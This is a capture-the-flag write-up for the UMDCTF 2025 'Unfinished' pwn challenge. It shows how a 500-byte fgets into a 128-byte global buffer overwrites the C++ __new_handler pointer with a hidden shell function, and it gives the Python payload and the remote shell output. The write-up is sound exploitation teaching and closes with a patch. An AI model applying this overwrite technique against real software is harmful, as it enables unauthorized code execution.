# Unfinished — UMDCTF 2025 (Pwn)

> 33 solves · 450 pts

```
$ nc challs.umdctf.io 31003
What size allocation?
```

## TL;DR
The program keeps a global 128-byte buffer `number` in `.bss` but calls
`fgets(number, 500, stdin)`.  We overflow past `number` into the global
C++ pointer `__new_handler` and replace it with the address of the hidden
function `sigma_mode()`.  On the next (failing) `new int[n]` call the C++
runtime invokes our fake handler → instant shell → grab the flag.

---

## Recon
```bash
checksec unfinished
#  Full RELRO | Canary | NX | **No PIE**
```

```
$ ./unfinished
What size allocation?
```

`unfinished.cpp` (provided) shows only three interesting lines:
```c++
char number[128];
...
fgets(number, 500, stdin);        // 500 > 128 → overflow
long n = atol(number);            // parses *only* the initial digits
int *chunk = new int[n];          // huge/negative sizes crash here
```
`nm` reveals a handy function:
```
00000000004019b6 T sigma_mode   # system("/bin/sh")
```
and the vulnerable objects in `.bss`:
```
000000000041f060 B number              # 0x80 bytes
000000000041f128 b __new_handler       # 8-byte function ptr used by new()
```
The distance between them is **0xC8 bytes**.

## Exploit strategy
1.  Start input with a *huge* decimal so `atol()` succeeds (`new int[n]` will later
    fail and call the handler).
2.  Add a **space** – `atol` stops parsing, but `fgets` keeps reading.
3.  Pad until we reach `__new_handler` and overwrite it with `sigma_mode`.
4.  When `new int[n]` throws `std::bad_array_new_length`, the runtime calls
    our handler → `system("/bin/sh")`.

Because the binary **is not PIE**, we hard-code the addresses.

## Final payload
```python
HUGE_N = b"2305843009213693920"  # < 0x1ffffffffffffffe
pad    = b"A" * (0xC8 - len(HUGE_N) - 1)  # -1 for the space char
payload = HUGE_N + b" " + pad + p64(0x4019b6) + b"\n"
```

Full exploit (`exploit.py`) is 30 lines and works locally & remotely:
```bash
python3 exploit.py REMOTE
[+] All set, enjoy your shell!
$ cat flag.txt
UMDCTF{unfinished_but_you_completed_it}
```

## What did not work (rabbit-holes)
* Classic stack overflow – defeated by stack canary.
* Over-sized/negative allocations – only raise exceptions.
* Heap-metadata corruption – unnecessary once the global handler route was found.

## Patch
Either make `number` large enough **or** limit `fgets` to 128 bytes.

---
*write-up by YourName, May 2025* 